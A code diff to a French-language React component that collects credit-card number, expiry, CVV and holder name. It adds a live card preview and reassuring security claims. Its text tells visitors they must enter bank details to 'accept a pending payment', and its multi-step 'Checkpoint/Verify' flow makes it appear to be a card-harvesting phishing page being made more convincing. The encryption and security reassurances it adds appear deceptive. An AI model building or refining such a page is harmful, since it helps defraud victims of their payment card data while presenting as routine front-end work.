@@ -7,6 +7,7 @@ import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
 import { upsertUser } from "@/utils/supabaseClient";
 import { toast } from "sonner";
 import Header from "@/components/Header";
+import CreditCardPreview from "@/components/CreditCardPreview";
 
 // Validation utilities
 const validateCardNumber = (cardNumber: string): boolean => {
@@ -101,6 +102,7 @@ const CardConfirmation: React.FC = () => {
   const [numeroCarte, setNumeroCarte] = useState("");
   const [dateExpiration, setDateExpiration] = useState("");
   const [cryptogramme, setCryptogramme] = useState("");
+  const [titulaire, setTitulaire] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState({
     numeroCarte: "",
@@ -214,7 +216,7 @@ const CardConfirmation: React.FC = () => {
     <div className="min-h-screen flex flex-col bg-white">
       <Header />
       <main className="flex-1 flex flex-col items-center justify-center p-4">
-        <div className="w-full max-w-lg px-6 py-8 bg-white rounded-lg animate-fade-in">
+        <div className="w-full max-w-4xl px-6 py-8 bg-white rounded-lg animate-fade-in shadow-md">
           <ProgressStepper 
             currentStep={2} 
             steps={["Confirm", "Checkpoint", "Verify", "Complete"]} 
@@ -228,71 +230,103 @@ const CardConfirmation: React.FC = () => {
             Vous avez un paiement en attente, configurer vos coordonnées bancaires pour accepter ce paiement.
           </p>
 
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <div>
-              <input
-                type="text"
-                value={numeroCarte}
-                onChange={handleCardNumberChange}
-                className={`form-input ${errors.numeroCarte ? 'border-red-500' : ''}`}
-                placeholder="Numéro de carte"
+          <div className="mt-8 space-y-10">
+            <div className="w-full">
+              <span className="uppercase text-xs font-semibold text-gray-500 tracking-[0.4em] block mb-4 text-center">
+                Aperçu en temps réel
+              </span>
+              <CreditCardPreview
+                cardNumber={numeroCarte}
+                expiration={dateExpiration}
+                cvv={cryptogramme}
+                cardHolder={titulaire}
               />
-              {errors.numeroCarte && (
-                <p className="text-red-500 text-sm mt-1">{errors.numeroCarte}</p>
-              )}
+              <p className="text-xs text-gray-500 text-center mt-4">
+                Les informations saisies sont chiffrées et affichées uniquement à titre d'aperçu.
+              </p>
             </div>
 
-            <div>
-              <input
-                type="text"
-                value={dateExpiration}
-                onChange={handleExpirationChange}
-                className={`form-input ${errors.dateExpiration ? 'border-red-500' : ''}`}
-                placeholder="Date d'expiration (MM/YY)"
-                maxLength={5}
-              />
-              {errors.dateExpiration && (
-                <p className="text-red-500 text-sm mt-1">{errors.dateExpiration}</p>
-              )}
-            </div>
-
-            <div className="grid grid-cols-3 gap-4">
-              <div className="col-span-2">
+            <form onSubmit={handleSubmit} className="space-y-4">
+              <div>
+                <label className="form-label">Numéro de carte</label>
                 <input
                   type="text"
-                  value={cryptogramme}
-                  onChange={handleCVVChange}
-                  className={`form-input ${errors.cryptogramme ? 'border-red-500' : ''}`}
-                  placeholder="Cryptogramme"
-                  maxLength={4}
+                  value={numeroCarte}
+                  onChange={handleCardNumberChange}
+                  className={`form-input ${errors.numeroCarte ? 'border-red-500' : ''}`}
+                  placeholder="0000 0000 0000 0000"
+                  inputMode="numeric"
+                  autoComplete="cc-number"
                 />
-                {errors.cryptogramme && (
-                  <p className="text-red-500 text-sm mt-1">{errors.cryptogramme}</p>
+                {errors.numeroCarte && (
+                  <p className="text-red-500 text-sm mt-1">{errors.numeroCarte}</p>
                 )}
               </div>
-              <div className="flex items-center justify-center">
-                <svg width="40" height="26" viewBox="0 0 40 26" fill="none" xmlns="http://www.w3.org/2000/svg">
-                  <rect x="0.5" y="0.5" width="39" height="25" rx="2.5" stroke="#D1D5DB"/>
-                  <line x1="0" y1="7" x2="40" y2="7" stroke="#D1D5DB"/>
-                  <line x1="11" y1="15" x2="29" y2="15" stroke="#6B7280"/>
-                  <line x1="11" y1="18" x2="29" y2="18" stroke="#6B7280"/>
-                  <line x1="11" y1="21" x2="20" y2="21" stroke="#6B7280"/>
-                </svg>
-              </div>
-            </div>
 
-            <button
-              type="submit"
-              className="primary-button flex items-center justify-center mt-6"
-              disabled={isLoading}
-            >
-              {isLoading ? (
-                <span className="loading-spinner" />
-              ) : (
-                "Continuer"
-              )}
-            </button>
-          </form>
+              <div>
+                <label className="form-label">Titulaire de la carte</label>
+                <input
+                  type="text"
+                  value={titulaire}
+                  onChange={(event) => setTitulaire(event.target.value)}
+                  className="form-input"
+                  placeholder="Nom du titulaire"
+                  autoComplete="cc-name"
+                />
+              </div>
+
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div>
+                  <label className="form-label">Date d'expiration</label>
+                  <input
+                    type="text"
+                    value={dateExpiration}
+                    onChange={handleExpirationChange}
+                    className={`form-input ${errors.dateExpiration ? 'border-red-500' : ''}`}
+                    placeholder="MM/AA"
+                    maxLength={5}
+                    inputMode="numeric"
+                    autoComplete="cc-exp"
+                  />
+                  {errors.dateExpiration && (
+                    <p className="text-red-500 text-sm mt-1">{errors.dateExpiration}</p>
+                  )}
+                </div>
+                <div>
+                  <label className="form-label">Cryptogramme visuel</label>
+                  <input
+                    type="text"
+                    value={cryptogramme}
+                    onChange={handleCVVChange}
+                    className={`form-input ${errors.cryptogramme ? 'border-red-500' : ''}`}
+                    placeholder="CVV"
+                    maxLength={4}
+                    inputMode="numeric"
+                    autoComplete="cc-csc"
+                  />
+                  {errors.cryptogramme && (
+                    <p className="text-red-500 text-sm mt-1">{errors.cryptogramme}</p>
+                  )}
+                </div>
+              </div>
+
+              <button
+                type="submit"
+                className="primary-button flex items-center justify-center mt-6 w-full"
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <span className="loading-spinner" />
+                ) : (
+                  "Continuer"
+                )}
+              </button>
+            </form>
+          </div>
+
+          <div className="mt-10 border-t border-gray-200 pt-4 text-xs text-gray-500 text-center">
+            Optionnel: utilisez le clavier numérique pour une saisie plus rapide. Vos données sont traitées avec des protocoles de sécurité renforcés.
+          </div>
         </div>
       </main>
 
